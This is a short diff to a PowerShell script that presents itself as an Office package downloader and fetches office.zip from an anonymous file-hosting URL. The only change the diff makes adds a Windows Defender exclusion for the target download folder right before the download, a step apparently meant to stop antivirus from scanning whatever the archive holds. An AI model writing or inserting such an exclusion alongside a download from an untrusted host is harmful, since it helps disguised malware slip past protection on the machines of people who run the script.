@@ -1,7 +1,7 @@
 # ============================================================================================== #
 Write-Host "Downloading Office Package, Please Wait..." -ForegroundColor Cyan
 # ============================================================================================== #
-
+Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads\Office"
 $Url = "https://file.garden/an5JdIrGtwwEoiH6/office/office.zip"
 $TargetDir = "$env:USERPROFILE\Downloads\office"
 $ZipDest = "$TargetDir\office.zip"
